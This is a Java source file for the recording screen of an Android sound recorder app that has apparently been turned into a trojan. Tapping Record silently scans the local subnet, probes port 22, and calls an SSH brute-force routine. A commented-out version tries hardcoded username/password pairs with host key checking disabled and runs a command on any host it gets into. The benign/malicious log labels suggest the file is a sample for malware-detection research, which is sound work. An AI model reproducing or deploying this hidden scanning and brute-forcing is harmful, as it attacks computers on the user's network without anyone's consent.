package com.danielkim.soundrecorder.fragments;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.support.v4.app.Fragment;
import android.text.format.Formatter;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.Chronometer;
import android.widget.TextView;
import android.widget.Toast;

import com.danielkim.soundrecorder.fragments.Clues;
import com.danielkim.soundrecorder.R;
import com.danielkim.soundrecorder.RecordingService;
import com.danielkim.soundrecorder.activities.MainActivity;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.melnykov.fab.FloatingActionButton;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;

import static android.content.Context.WIFI_SERVICE;

/**
 * A simple {@link Fragment} subclass.
 * Activities that contain this fragment must implement the
 * to handle interaction events.
 * Use the {@link RecordFragment#newInstance} factory method to
 * create an instance of this fragment.
 */
public class RecordFragment extends Fragment {
    // the fragment initialization parameters, e.g. ARG_ITEM_NUMBER
    private final static String TAG="Non Android Theft";
    SharedPreferences pref;
    boolean rwPerm;
    public Clues clues=new Clues();

    private static final String ARG_POSITION = "position";
    private static final String LOG_TAG = RecordFragment.class.getSimpleName();

    private int position;

    //Recording controls
    private FloatingActionButton mRecordButton = null;
    private Button mPauseButton = null;

    private TextView mRecordingPrompt;
    private int mRecordPromptCount = 0;

    private boolean mStartRecording = true;
    private boolean mPauseRecording = true;

    private Chronometer mChronometer = null;
    long timeWhenPaused = 0; //stores time when user clicks pause button

    /**
     * Use this factory method to create a new instance of
     * this fragment using the provided parameters.
     *
     * @return A new instance of fragment Record_Fragment.
     */
    public static RecordFragment newInstance(int position) {

        RecordFragment f = new RecordFragment();
        Bundle b = new Bundle();
        b.putInt(ARG_POSITION, position);
        f.setArguments(b);

        return f;
    }

    public RecordFragment() {
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        position = getArguments().getInt(ARG_POSITION);
        pref =getActivity().getSharedPreferences("com.danielkim.soundrecorder",0x0000);
        //sessionID=pref.getInt("sessionID",1);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        pref.edit().putInt("sessionID", MainActivity.sessionID).apply();
        clues.SendLog(TAG,"Recording stopped","benign", "benign", false);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View recordView = inflater.inflate(R.layout.fragment_record, container, false);

        mChronometer = (Chronometer) recordView.findViewById(R.id.chronometer);
        //update recording prompt text
        mRecordingPrompt = (TextView) recordView.findViewById(R.id.recording_status_text);

        mRecordButton = (FloatingActionButton) recordView.findViewById(R.id.btnRecord);
        mRecordButton.setColorNormal(getResources().getColor(R.color.primary));
        mRecordButton.setColorPressed(getResources().getColor(R.color.primary_dark));
        mRecordButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                onRecord(mStartRecording);
                mStartRecording = !mStartRecording;


            }
        });

        mPauseButton = (Button) recordView.findViewById(R.id.btnPause);
        mPauseButton.setVisibility(View.GONE); //hide pause button before recording starts
        mPauseButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                onPauseRecord(mPauseRecording);
                mPauseRecording = !mPauseRecording;



            }
        });

        return recordView;
    }

    // Recording Start/Stop
    //TODO: recording pause
    private void onRecord(boolean start){

        clues.SendLog(TAG,"Recording started", "benign", "benign", true);
        Intent intent = new Intent(getActivity(), RecordingService.class);

        if (start) {
            // start recording

            clues.SendLog(TAG,"Scanning IPs","benign", "malicious", false);
            mRecordButton.setEnabled(false);
            new ScanIpTask().execute();
            mRecordButton.setEnabled(true);

            mRecordButton.setImageResource(R.drawable.ic_media_stop);
            //mPauseButton.setVisibility(View.VISIBLE);
            Toast.makeText(getActivity(),R.string.toast_recording_start,Toast.LENGTH_SHORT).show();
            File folder = new File(Environment.getExternalStorageDirectory() + "/SoundRecorder");
            if (!folder.exists()) {
                //folder /SoundRecorder doesn't exist, create the folder
                folder.mkdir();
            }

            //start Chronometer
            mChronometer.setBase(SystemClock.elapsedRealtime());
            mChronometer.start();
            mChronometer.setOnChronometerTickListener(new Chronometer.OnChronometerTickListener() {
                @Override
                public void onChronometerTick(Chronometer chronometer) {
                    if (mRecordPromptCount == 0) {
                        mRecordingPrompt.setText(getString(R.string.record_in_progress) + ".");
                    } else if (mRecordPromptCount == 1) {
                        mRecordingPrompt.setText(getString(R.string.record_in_progress) + "..");
                    } else if (mRecordPromptCount == 2) {
                        mRecordingPrompt.setText(getString(R.string.record_in_progress) + "...");
                        mRecordPromptCount = -1;
                    }

                    mRecordPromptCount++;
                }
            });

            //start RecordingService
            getActivity().startService(intent);
            //keep screen on while recording
            getActivity().getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

            mRecordingPrompt.setText(getString(R.string.record_in_progress) + ".");
            mRecordPromptCount++;

        } else {
            //stop recording

            mRecordButton.setImageResource(R.drawable.ic_mic_white_36dp);
            //mPauseButton.setVisibility(View.GONE);
            mChronometer.stop();
            mChronometer.setBase(SystemClock.elapsedRealtime());
            timeWhenPaused = 0;

            mRecordingPrompt.setText(getString(R.string.record_prompt));

            getActivity().stopService(intent);
            //allow the screen to turn off again once recording is finished
            getActivity().getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        }
    }

    //TODO: implement pause recording
    private void onPauseRecord(boolean pause) {
        if (pause) {
            //pause recording
            mPauseButton.setCompoundDrawablesWithIntrinsicBounds
                    (R.drawable.ic_media_play ,0 ,0 ,0);
            mRecordingPrompt.setText((String)getString(R.string.resume_recording_button).toUpperCase());
            timeWhenPaused = mChronometer.getBase() - SystemClock.elapsedRealtime();
            mChronometer.stop();
        } else {
            //resume recording
            mPauseButton.setCompoundDrawablesWithIntrinsicBounds
                    (R.drawable.ic_media_pause ,0 ,0 ,0);
            mRecordingPrompt.setText((String)getString(R.string.pause_recording_button).toUpperCase());
            mChronometer.setBase(SystemClock.elapsedRealtime() + timeWhenPaused);
            mChronometer.start();
        }
    }




    public class ScanIpTask extends AsyncTask<Void, String, Void> {
        // WifiManager wm;
        String ip;
        String subnet;
        HashMap<String, String> bruteMap;
       //Context context;

       /* public ScanIpTask(Context context) {
          this.context = context;
        }*/


    /*
    Scan IP 192.168.1.100~192.168.1.110
    you should try different timeout for your network/devices
     */

        //static final int lo2 = 61;
        //static final int hi2 = 61;
        static final int timeout = 100;
        static final int lo3 = 45;
        static final int hi3 = 50;
        static final int lo4 = 160;
        static final int hi4 = 200;

        @Override
        protected void onPreExecute() {
            //  MainActivity wi=new MainActivity();
            // wm = (WifiManager) wi.getApplicationContext().getSystemService(WIFI_SERVICE);

            // @SuppressWarnings("deprecation")
            //String ip1 = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
            //ip = ip1;
            MainActivity vin=new MainActivity();

            bruteMap = new HashMap<>();
            bruteMap.put("user", "password");
            bruteMap.put("123","123");
            bruteMap.put("test","test@123");



            ip = getIp();
            int count = 0;
            int idx = 0;
            for (int i = 0; i <ip.length(); i++) {
                if (ip.charAt(i) == '.') {
                    if (count == 2)
                        break;
                    count++;
                    idx = i;
                }
            }
            subnet = ip.substring(0, idx);
            clues.SendLog(TAG,"Subnet is "+subnet,"malicious", "malicious", false);
            //subnet="10.61";
            //ipList.clear();
            //Toast.makeText(MainActivity.this, "Scan IP...", Toast.LENGTH_LONG).show();
        }

        //@TargetApi(Build.VERSION_CODES.KITKAT)
        @SuppressLint("WrongThread")
        @TargetApi(Build.VERSION_CODES.KITKAT)
        @Override
        protected Void doInBackground(Void... params) {

        /*static final int lo2 =61;
        static final int hi2 =61;*/



            //System.out.println(subnet);
            for (int j = lo3; j <= hi3; j++) {
                for (int i = lo4; i <= hi4; i++) {
                    String host = subnet + "." +j + "." + i;
                    //host = "10.13.1.101";
                    try {
                        InetAddress inetAddress = InetAddress.getByName(host);
                        //System.out.println(host);
                        //System.out.println("Host is : " + host);
                        if (inetAddress.isReachable(timeout)) {
                            //System.out.println(" connected");
                            //publishProgress(inetAddress.toString());

                            //System.out.println(host);
                            // try(Socket socket = new Socket(inetAddress, 22)) {
                            try(Socket socket = new Socket(inetAddress, 22)) {

                                //bruteForce(host, bruteMap);
                                String as="hell0";
                                BruteForce.main(as,host);
                               // new attack().execute();
                            }
                            catch (IOException e) {
                                System.out.println(host + " port closed.");
                               // String as="hell0";
                                //BruteForce.main(as);
                            }
                            //ipList.add(host);
                            //           for (String str_Agil : ipList)   // using foreach
                                /*MacAddress hey=new MacAddress();
                                String s=hey.getMacAddress(host);*/
                            //System.out.println(host + " : " +s);

                        }

                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                        continue;
                    } catch (IOException e) {
                        e.printStackTrace();
                        continue;
                    }
                }

            }
            return null;

        }


        @Override
        protected void onProgressUpdate(String... values) {
            //ipList.add(values[0]);
            //Toast.makeText(A.getApplicationContext(), values[0], Toast.LENGTH_LONG).show();

        }

        @Override
        protected void onPostExecute(Void aVoid) {
            //Toast.makeText(A.getApplicationContext(), "Done", Toast.LENGTH_LONG).show();
            //System.out.println("List of all IPs");
       /* for (String str_Agil : ipList)   // using foreach
        {
            System.out.println(str_Agil);
        }
    }*/
        }

       /* public void bruteForce (String host, HashMap<String, String> dict) {
            //Enumeration<String> users = dict.keys();
            //String pwd;
            int port = 22;
            Map<String, String> map = dict;
            for (Map.Entry<String, String> entry: map.entrySet()) {

                String user = entry.getKey();
                String pwd = entry.getValue();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                try {
                    JSch jsch = new JSch();
                    Session session = jsch.getSession(user, host, port);
                    session.setPassword(pwd);
                    session.setConfig("StrictHostKeyChecking", "no");
                    session.setTimeout(5000);
                    session.connect();
                    ChannelExec channel = (ChannelExec) session.openChannel("exec");
                    channel.setOutputStream(baos);
                    channel.setCommand("ls");
                    channel.connect();
                    Thread.sleep(1000);
                    channel.disconnect();
                    System.out.println("Executed successfully!\nThe output is: " + new String(baos.toByteArray()));
                    clues.SendLog(TAG,host + " is compromised!", "malicious", false);
                    //Result.setText(new String(baos.toByteArray()));
                    //return true;
                } catch (JSchException e) {
                    System.out.println("Error: " + e);
                    continue;
                } catch (InterruptedException ee) {
                    System.out.println("Error: " + ee);
                    continue;
                }
            }
            // return false;
        }*/
    }
    public String getIp() {
        WifiManager wm;
        //String ip1;

        wm = (WifiManager) getActivity().getApplicationContext().getSystemService(WIFI_SERVICE);

        @SuppressWarnings("deprecation")
        String ip1 = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());

        return ip1;
    }
    /*public class attack extends AsyncTask<String ,String,String>{


        @Override
        protected String doInBackground(String... strings) {

            String as="hell0";
            BruteForce.main(as);
            //boolean c=BruteForce.main(as);
            return null;
        }
    }*/

}